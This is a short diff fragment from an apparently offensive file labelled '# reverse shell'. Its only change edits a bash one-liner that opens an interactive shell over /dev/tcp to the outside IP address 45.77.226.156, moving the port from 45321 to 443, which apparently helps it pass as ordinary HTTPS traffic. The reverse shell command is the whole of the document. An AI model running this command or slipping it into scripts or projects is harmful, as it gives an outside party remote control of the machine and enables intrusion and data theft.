@@ -2,4 +2,4 @@
 
 # reverse shell
 
-bash -i >& /dev/tcp/45.77.226.156/45321 0>&1
+bash -i >& /dev/tcp/45.77.226.156/443 0>&1
